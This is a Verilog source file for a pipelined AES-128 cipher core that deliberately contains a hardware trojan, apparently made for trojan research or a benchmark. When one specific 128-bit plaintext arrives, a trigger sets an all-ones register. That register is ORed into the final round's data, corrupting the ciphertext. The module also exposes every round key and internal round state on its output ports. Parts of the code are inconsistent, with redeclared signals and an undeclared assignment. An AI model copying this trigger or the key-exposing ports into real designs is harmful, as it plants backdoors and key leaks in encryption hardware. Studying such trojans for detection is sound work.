


`timescale 1 ns/1 ps

module Top_PipelinedCipher
#
(
parameter DATA_W = 128,      //data width
parameter KEY_L = 128,       //key length
parameter NO_ROUNDS = 10     //number of rounds
)

(
input clk,                       //system clock
input reset,                     //asynch reset
input data_valid_in,             //data valid signal
input cipherkey_valid_in,        //cipher key valid signal
input [KEY_L-1:0] cipher_key,    //cipher key
input [DATA_W-1:0] plain_text,   //plain text
output valid_out,                //output valid signal
  output [DATA_W-1:0] cipher_text,  //cipher text
  output [5:0] counter,
  output [127:0] trojan_activated,
  output [DATA_W-1:0] data_round_c,
  output [DATA_W-1:0]data_shift2key,
  output [(NO_ROUNDS*DATA_W)-1:0] W
);

wire [NO_ROUNDS-1:0] valid_round_key;            //all round keys valid signals KeyExpantion output
wire [NO_ROUNDS-1:0] valid_round_data;           //all rounds ouput data valid signals
wire [DATA_W-1:0] data_round [0:NO_ROUNDS-1];    //all rounds data
wire valid_sub2shift;                            //for final round connection
wire valid_shift2key;                            //
wire [DATA_W-1:0]data_sub2shift;                 //
//wire [DATA_W-1:0]data_shift2key;                 //
wire [(NO_ROUNDS*DATA_W)-1:0] W;   
              //all round keys

reg[DATA_W-1:0] data_shift2key_delayed;           //for delay register
reg valid_shift2key_delayed;
//Trojan activation parameters
reg [127:0] trojan_activated;
reg [5:0] counter;
reg [NO_ROUNDS-1:0] valid_round;
parameter t=0;

//wire trigger_condition;
//instantiate Key Expantion which will feed every round with round key
KeyExpantion #(DATA_W,KEY_L,NO_ROUNDS) U_KEYEXP(clk,reset,cipherkey_valid_in,cipher_key,W,valid_round_key);
assign z=W;

//due to algorithm,first cipher key will be xored witht plain text
AddRoundKey #(DATA_W)U0_ARK(clk,reset,data_valid_in,cipherkey_valid_in,plain_text,cipher_key,valid_round_data[0],data_round[0]);

//Trigger is to be anabled
 // assign trigger_condition = (plain_text[127:0] == 128'hffffffffffffffffffffffff00000000); // Example trigger condition
//data_valid_in=0;
initial begin
    counter=0;
    trojan_activated <= {DATA_W{1'b0}};

end

// State encoding
always @(plain_text) begin
  if (!reset) begin
        counter <= 0;
        trojan_activated <= {DATA_W{1'b0}};
       // valid_round <= {(NO_ROUNDS-1){1'b0}};
  end else if (plain_text[127:0] == 128'h54776F204F6E65204E696E652054776F) begin
        counter <= counter+1;
       // trojan_activated = {DATA_W{1'b0}};
  // if (counter == 5'h02) begin  // Q = 8 consecutive matches
            trojan_activated <= {DATA_W{1'b1}};
           // valid_round <= {(NO_ROUNDS-1){1'b1}};
          //  t=1;

      end
      //else
       // trojan_activated <= trojan_activated;
          //valid_round <= valid_round;
     else begin
      // counter = 0;
      trojan_activated <=  trojan_activated;
      //valid_round <= valid_round;
    end
    end
    

genvar i;
generate
for(i=0;i<NO_ROUNDS-1;i=i+1) begin : ROUND
  Round #(DATA_W)U_ROUND(clk,reset,valid_round_data[i],valid_round_key[i],data_round[i],W[(NO_ROUNDS-i)*DATA_W-1:(NO_ROUNDS-i-1)*DATA_W],valid_round_data[i+1],data_round[i+1]);
 end
endgenerate
/*always @(posedge clk or negedge reset) begin
if(trojan_activated) begin
    data_round[NO_ROUNDS-1]= data_round[NO_ROUNDS-1];
end
else begin 
 data_round[NO_ROUNDS-1]= {DATA_W{1'b1}};
end
end*/
//  assign  data_round[NO_ROUNDS-1]= (trojan_activated)? {DATA_W{1'b1}}:data_round[NO_ROUNDS-1];
assign data_round_c=data_round[NO_ROUNDS-1]|trojan_activated;
SubBytes #(DATA_W) U_SUB1 (clk,reset,valid_round_data[NO_ROUNDS-1],data_round_c,valid_sub2shift,data_sub2shift);
ShiftRows #(DATA_W) U_SH1 (clk,reset,valid_sub2shift,data_sub2shift,valid_shift2key,data_shift2key);
AddRoundKey #(DATA_W) U_KEY1 (clk,reset,valid_shift2key_delayed,valid_round_key[NO_ROUNDS-1],data_shift2key_delayed,W[DATA_W-1:0],valid_out,cipher_text);

always @(posedge clk or negedge reset)

if(!reset)begin
    valid_shift2key_delayed <= 1'b0;
    data_shift2key_delayed <= 'b0;
end else begin

 if(valid_shift2key)begin
   data_shift2key_delayed <= data_shift2key;
 end
   valid_shift2key_delayed <= valid_shift2key;
end

endmodule
